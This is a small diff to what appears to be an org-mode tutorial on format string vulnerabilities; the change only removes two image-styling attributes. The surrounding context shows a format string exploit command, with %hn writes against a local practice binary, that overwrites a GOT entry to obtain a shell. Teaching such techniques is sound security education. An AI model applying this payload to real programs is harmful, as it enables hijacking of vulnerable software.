@@ -215,7 +215,6 @@ From that point, the procedure is pretty straight forward.
 
 4. Get ~exit~ address in GOT
 
-   #+attr_html: :class centered-image
    [[../../images/format_string_vuln/got-table.png]]
 
 5. Exploit
@@ -224,7 +223,6 @@ From that point, the procedure is pretty straight forward.
      ./fmt.out $(printf "\x7a\xb2\x04\x08\x78\xb2\x04\x08")%65527x%4\$hn%55737x%5\$hn
    #+end_src
 
-   #+attr_html: :class centered-image
    [[../../images/format_string_vuln/shell-execution.png]]
 
 * Conclusion
